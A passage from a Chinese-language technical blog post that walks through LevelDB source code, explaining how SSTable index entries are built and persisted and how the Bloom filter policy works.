entry?</h3><p>下面结合源码看一下</p><p>==TableBuilder::Add==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Add</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">   ...</span><br><span class="line">     <span class="comment">// 添加index entry</span></span><br><span class="line">  <span class="keyword">if</span> (r-&gt;pending_index_entry) &#123;</span><br><span class="line">    assert(r-&gt;data_block.empty());</span><br><span class="line">      <span class="comment">// 计算index entry key</span></span><br><span class="line">    r-&gt;options.comparator-&gt;FindShortestSeparator(&amp;r-&gt;last_key, key);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> handle_encoding;</span><br><span class="line">      <span class="comment">// 编码data block的位置信息</span></span><br><span class="line">    r-&gt;pending_handle.EncodeTo(&amp;handle_encoding);</span><br><span class="line">      <span class="comment">// 添加一个index entry</span></span><br><span class="line">    r-&gt;index_block.Add(r-&gt;last_key, Slice(handle_encoding));</span><br><span class="line">      <span class="comment">// 生成添加一个index entry后，设置为false,等待下一个data block被Flush</span></span><br><span class="line">    r-&gt;pending_index_entry = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    r-&gt;filter_block-&gt;AddKey(key);</span><br><span class="line">  &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的代码可以看出，是否添加一个index entry, 由pending_index_entry控制。看下它的源码定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// We do not emit the index entry for a block until we have seen the</span></span><br><span class="line"><span class="comment">// first key for the next data block.  This allows us to use shorter</span></span><br><span class="line"><span class="comment">// keys in the index block.  For example, consider a block boundary</span></span><br><span class="line"><span class="comment">// between the keys "the quick brown fox" and "the who".  We can use</span></span><br><span class="line"><span class="comment">// "the r" as the key for the index block entry since it is &gt;= all</span></span><br><span class="line"><span class="comment">// entries in the first block and &lt; all entries in subsequent</span></span><br><span class="line"><span class="comment">// blocks.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Invariant: r-&gt;pending_index_entry is true only if data_block is empty.</span></span><br><span class="line"><span class="keyword">bool</span> pending_index_entry;</span><br></pre></td></tr></table></figure><p>上面的意思是说，只有当下一个block的第一个key Add进来时，pending_index_entry会被设置为true.  那什么时候添加一个index entry就很明朗了，==当当前data block被Flush到SST, 且下一个block的第一个key被添加时，会写入一个index entry，用于索引刚才被Flush的block==。</p><p>我们来看看pending_index_entry在源码中是什么时候被设置为true的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Flush</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">  assert(!r-&gt;closed);</span><br><span class="line">  <span class="keyword">if</span> (!ok()) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;data_block.empty()) <span class="keyword">return</span>;</span><br><span class="line">  assert(!r-&gt;pending_index_entry);</span><br><span class="line">   <span class="comment">// 注意这里的pending_handle, 保存了这个data block的位置信息。</span></span><br><span class="line">  WriteBlock(&amp;r-&gt;data_block, &amp;r-&gt;pending_handle);</span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">      <span class="comment">// 这里被设置为true</span></span><br><span class="line">    r-&gt;pending_index_entry = <span class="literal">true</span>;</span><br><span class="line">    r-&gt;status = r-&gt;file-&gt;Flush();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    r-&gt;filter_block-&gt;StartBlock(r-&gt;offset);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数说明了两个点：</p><ol><li><p>解释了pending_index_entry在一个block被flush时才被设置为true.</p></li><li><p>解释了index entry的value，即指向的data block的位置信息是什么时候生成的。 这里在深追一点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::WriteRawBlock</span><span class="params">(<span class="keyword">const</span> Slice&amp; block_contents,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 CompressionType type, BlockHandle* handle)</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">    <span class="comment">// 在这里设置</span></span><br><span class="line">  handle-&gt;set_offset(r-&gt;offset);</span><br><span class="line">  handle-&gt;set_size(block_contents.<span class="built_in">size</span>());</span><br><span class="line">  r-&gt;status = r-&gt;file-&gt;Append(block_contents);</span><br><span class="line">  ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="3-index-entry的key是如何计算的？"><a href="#3-index-entry的key是如何计算的？" class="headerlink" title="3. index entry的key是如何计算的？"></a>3. index entry的key是如何计算的？</h3><p>前面说了 index entry key 是介于两个block的key之间的。那它是如何计算的？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Add</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (r-&gt;pending_index_entry) &#123;</span><br><span class="line">    assert(r-&gt;data_block.empty());</span><br><span class="line">      <span class="comment">// 将计算后的key放在r-&gt;last_key中。</span></span><br><span class="line">    r-&gt;options.comparator-&gt;FindShortestSeparator(&amp;r-&gt;last_key, key);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> handle_encoding;</span><br><span class="line">    r-&gt;pending_handle.EncodeTo(&amp;handle_encoding);</span><br><span class="line">    r-&gt;index_block.Add(r-&gt;last_key, Slice(handle_encoding));</span><br><span class="line">    r-&gt;pending_index_entry = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点在==FindShortestSeparator==函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FindShortestSeparator</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>* start,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">const</span> Slice&amp; limit)</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line"><span class="comment">// diff_index指向 start串和limit串的第一个不同点。 或者其中一个是另一个的子串</span></span><br><span class="line">    <span class="comment">// Find length of common prefix</span></span><br><span class="line">  <span class="keyword">size_t</span> min_length = <span class="built_in">std</span>::<span class="built_in">min</span>(start-&gt;<span class="built_in">size</span>(), limit.<span class="built_in">size</span>());</span><br><span class="line">  <span class="keyword">size_t</span> diff_index = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ((diff_index &lt; min_length) &amp;&amp;</span><br><span class="line">         ((*start)[diff_index] == limit[diff_index])) &#123;</span><br><span class="line">    diff_index++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (diff_index &gt;= min_length) &#123;<span class="comment">// 如果其中一个是另一个的子串， 直接用start串作为entry的key</span></span><br><span class="line">    <span class="comment">// Do not shorten if one string is a prefix of the other</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;<span class="comment">// 否则</span></span><br><span class="line">    <span class="keyword">uint8_t</span> diff_byte = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;((*start)[diff_index]);</span><br><span class="line">    <span class="keyword">if</span> (diff_byte &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(<span class="number">0xff</span>) &amp;&amp;</span><br><span class="line">        diff_byte + <span class="number">1</span> &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(limit[diff_index])) &#123;</span><br><span class="line">      (*start)[diff_index]++;<span class="comment">// 不同的地方+1，使得生成的key 处于 [上一个block key， 下一个block key]</span></span><br><span class="line">      start-&gt;resize(diff_index + <span class="number">1</span>);<span class="comment">// 生成最终key</span></span><br><span class="line">      assert(Compare(*start, limit) &lt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里解释一下上面的代码：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-index entry key计算方式.png" style="zoom:50%;" /><p>这里分别说两点：</p><ol><li><p>为什么start可以直接作为entry的key，不是要求entry key要 &lt;=limit吗？ 万一start大于limit了呢？</p><p>这里limit是新block的新key，一定是比旧block的key大的。</p></li><li><p>后半段代码分析</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> diff_byte = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;((*start)[diff_index]);</span><br><span class="line">     <span class="keyword">if</span> (diff_byte &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(<span class="number">0xff</span>) &amp;&amp;</span><br><span class="line">         diff_byte + <span class="number">1</span> &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(limit[diff_index])) &#123;</span><br><span class="line">       (*start)[diff_index]++;<span class="comment">// 不同的地方+1，使得生成的key 处于 [上一个block key， 下一个block key]</span></span><br><span class="line">       start-&gt;resize(diff_index + <span class="number">1</span>);<span class="comment">// 生成最终key</span></span><br><span class="line">       assert(Compare(*start, limit) &lt; <span class="number">0</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><ol><li><p>取出第一个不同的字节，要求这个字节所对应的 uint8 value &lt;255 并且 该值+1 后的值也小于 Limit对应位置的value。</p></li><li><p>首个不同字节的位置的值+1</p></li></ol><p>这里我描述的不好，所以举个例子：</p><p>==情况1: start不是limit的子串==</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*start:    helloleveldb        上一个data block的最后一个key</span><br><span class="line">limit:     helloworld          下一个data block的第一个key</span><br></pre></td></tr></table></figure><p>那么调用FindShortestSeparator后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start变成： hellom (保留前缀，第一个不相同的字符+1)</span><br><span class="line">即l+1 &#x3D; m</span><br></pre></td></tr></table></figure><p>==情况2: start是limit的子串==</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*start:    hello               上一个data block的最后一个key</span><br><span class="line">limit:     helloworld          下一个data block的第一个key</span><br></pre></td></tr></table></figure><p>那么调用FindShortestSeparator后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start变成：</span><br><span class="line"> hello</span><br></pre></td></tr></table></figure><h3 id="4-index-block如何持久化到硬件上？"><a href="#4-index-block如何持久化到硬件上？" class="headerlink" title="4. index block如何持久化到硬件上？"></a>4. index block如何持久化到硬件上？</h3><p>上面所做的Add操作，只是将生成的index entry放在内存的index block，如何将index block持久化？</p><p>==TableBuilder::Finish==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">TableBuilder::Finish</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  xxx</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write index block</span></span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;pending_index_entry) &#123;</span><br><span class="line">      r-&gt;options.comparator-&gt;FindShortSuccessor(&amp;r-&gt;last_key);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> handle_encoding;</span><br><span class="line">      r-&gt;pending_handle.EncodeTo(&amp;handle_encoding);</span><br><span class="line">      r-&gt;index_block.Add(r-&gt;last_key, Slice(handle_encoding));</span><br><span class="line">      r-&gt;pending_index_entry = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 持久化index block,并记录index block的位置信息到index_block_handle</span></span><br><span class="line">    WriteBlock(&amp;r-&gt;index_block, &amp;index_block_handle);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write footer</span></span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">    Footer footer;</span><br><span class="line">    footer.set_metaindex_handle(metaindex_block_handle);</span><br><span class="line">     <span class="comment">// 记录index block handle的位置信息到footer中</span></span><br><span class="line">    footer.set_index_handle(index_block_handle);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> footer_encoding;</span><br><span class="line">    footer.EncodeTo(&amp;footer_encoding);</span><br><span class="line">    r-&gt;status = r-&gt;file-&gt;Append(footer_encoding);</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;status.ok()) &#123;</span><br><span class="line">      r-&gt;offset += footer_encoding.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> r-&gt;status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的重点都用注释表示了。</p><p>现在再想想如何索引一个key？ 首先找到固定的footer，通过footer找到index block,通过index block找到data block, 在通过data block就可以找到key了。</p><h3 id="5-什么时候持久化index-block"><a href="#5-什么时候持久化index-block" class="headerlink" title="5. 什么时候持久化index block?"></a>5. 什么时候持久化index block?</h3><p>目前有3个地方都调用了 ==TableBuilder::Finish==</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200923203705354.png" alt="image-20200923203705354"></p><p>只有持久化SSTable时，才会持久化index block. 从SSTable的layout也可以看出来，因为一个SSTable只有一个index block。</p><h2 id="5-Meta-Block-amp-Meta-Index-Block"><a href="#5-Meta-Block-amp-Meta-Index-Block" class="headerlink" title="5. Meta Block &amp; Meta Index Block"></a>5. Meta Block &amp; Meta Index Block</h2><p>前面介绍了 footer, data block 和 index block, 似乎已经可以完成数据的存与取，但是这样会带来一个问题，search性能过低的问题。如果每次都从footer-&gt;index block-&gt;data  block-&gt;key / value pair, search性能明显不行。 所以leveldb使用了bloom filter来做优化。</p><p>bloom filter是什么，参数的设定，可参考：</p><p>Onenote中笔记，后序添加。</p><p>这里先给出bloom filter的几个参数：</p><ol><li>m: bloom filter的比特位数</li><li>n: 预计的key的个数</li><li>k: 使用的hash function的个数</li></ol><h3 id="1-BloomFilterPolicy："><a href="#1-BloomFilterPolicy：" class="headerlink" title="1. BloomFilterPolicy："></a>1. BloomFilterPolicy：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BloomFilterPolicy</span> :</span> <span class="keyword">public</span> FilterPolicy &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">BloomFilterPolicy</span><span class="params">(<span class="keyword">int</span> bits_per_key)</span> : <span class="title">bits_per_key_</span><span class="params">(bits_per_key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// We intentionally round down to reduce probing cost a little bit</span></span><br><span class="line">    k_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(bits_per_key * <span class="number">0.69</span>);  <span class="comment">// 0.69 =~ ln(2)</span></span><br><span class="line">    <span class="keyword">if</span> (k_ &lt; <span class="number">1</span>) k_ = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (k_ &gt; <span class="number">30</span>) k_ = <span class="number">30</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> <span class="string">"leveldb.BuiltinBloomFilter2"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">CreateFilter</span><span class="params">(<span class="keyword">const</span> Slice* keys, <span class="keyword">int</span> n, <span class="built_in">std</span>::<span class="built_in">string</span>* dst)</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Compute bloom filter size (in both bits and bytes)</span></span><br><span class="line">    <span class="keyword">size_t</span> bits = n * bits_per_key_;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// For small n, we can see a very high false positive rate.  Fix it</span></span><br><span class="line">    <span class="comment">// by enforcing a minimum bloom filter length.</span></span><br><span class="line">    <span class="keyword">if</span> (bits &lt; <span class="number">64</span>) bits = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> bytes = (bits + <span class="number">7</span>) / <span class="number">8</span>;</span><br><span class="line">    bits = bytes * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> init_size = dst-&gt;<span class="built_in">size</span>();</span><br><span class="line">    dst-&gt;resize(init_size + bytes, <span class="number">0</span>);</span><br><span class="line">    dst-&gt;push_back(<span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(k_));  <span class="comment">// Remember # of probes in filter</span></span><br><span class="line">    <span class="keyword">char</span>* <span class="built_in">array</span> = &amp;(*dst)[init_size];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      <span class="comment">// Use double-hashing to generate a sequence of hash values.</span></span><br><span class="line">      <span class="comment">// See analysis in [Kirsch,Mitzenmacher 2006].</span></span><br><span class="line">      <span class="keyword">uint32_t</span> h = BloomHash(keys[i]);</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint32_t</span> delta = (h &gt;&gt; <span class="number">17</span>) | (h &lt;&lt; <span class="number">15</span>);  <span class="comment">// Rotate right 17 bits</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; k_; j++) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">uint32_t</span> bitpos = h % bits;</span><br><span class="line">        <span class="built_in">array</span>[bitpos / <span class="number">8</span>] |= (<span class="number">1</span> &lt;&lt; (bitpos % <span class="number">8</span>));</span><br><span class="line">        h += delta;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">KeyMayMatch</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; bloom_filter)</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> len = bloom_filter.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* <span class="built_in">array</span> = bloom_filter.data();</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> bits = (len - <span class="number">1</span>) * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use the encoded k so that we can read filters generated by</span></span><br><span class="line">    <span class="comment">// bloom filters created using different parameters.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> k = <span class="built_in">array</span>[len - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (k &gt; <span class="number">30</span>) &#123;</span><br><span class="line">      <span class="comment">// Reserved for potentially new encodings for short bloom filters.</span></span><br><span class="line">      <span class="comment">// Consider it a match.</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> h = BloomHash(key);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> delta = (h &gt;&gt; <span class="number">17</span>) | (h &lt;&lt; <span class="number">15</span>);  <span class="comment">// Rotate right 17 bits</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint32_t</span> bitpos = h % bits;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">array</span>[bitpos / <span class="number">8</span>] &amp; (<span class="number">1</span> &lt;&lt; (bitpos % <span class="number">8</span>))) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      h += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">size_t</span> bits_per_key_;<span class="comment">// m/n</span></span><br><span class="line">  <span class="keyword">size_t</span> k_;<span class="comment">// hash function 个数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1. 初始化"></a>1. 初始化</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">BloomFilterPolicy</span><span class="params">(<span class="keyword">int</span> bits_per_key)</span> : <span class="title">bits_per_key_</span><span class="params">(bits_per_key)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// We intentionally round down to reduce probing cost a little bit</span></span><br><span class="line">  k_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(bits_per_key * <span class="number">0.69</span>);  <span class="comment">// 0.69 =~ ln(2)</span></span><br><span class="line">  <span class="keyword">if</span> (k_ &lt; <span class="number">1</span>) k_ = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (k_ &gt; <span class="number">30</span>) k_ = <span class="number">30</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bloom filter的初始化只用到了bits_per_key, hash function个数可以通过计算得到:<br>$$<br>k = bits_per_key \times log2<br>$$</p><h4 id="2-CreateFilter"><a href="#2-CreateFilter" class="headerlink" title="2. CreateFilter"></a>2. CreateFilter</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateFilter</span><span class="params">(<span class="keyword">const</span> Slice* keys, <span class="keyword">int</span> n, <span class="built_in">std</span>::<span class="built_in">string</span>* dst)</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1.得到bloom filter用的bit数</span></span><br><span class="line">  <span class="comment">// Compute bloom filter size (in both bits and bytes)</span></span><br><span class="line">  <span class="keyword">size_t</span> bits = n * bits_per_key_;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// For small n, we can see a very high false positive rate.  Fix it</span></span><br><span class="line">  <span class="comment">// by enforcing a minimum bloom filter length.</span></span><br><span class="line">  <span class="keyword">if</span> (bits &lt; <span class="number">64</span>) bits = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> bytes = (bits + <span class="number">7</span>) / <span class="number">8</span>;</span><br><span class="line">  bits = bytes * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> init_size = dst-&gt;<span class="built_in">size</span>();</span><br><span class="line">  dst-&gt;resize(init_size + bytes, <span class="number">0</span>);</span><br><span class="line">  dst-&gt;push_back(<span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(k_));  <span class="comment">// Remember # of probes in filter</span></span><br><span class="line">  <span class="keyword">char</span>* <span class="built_in">array</span> = 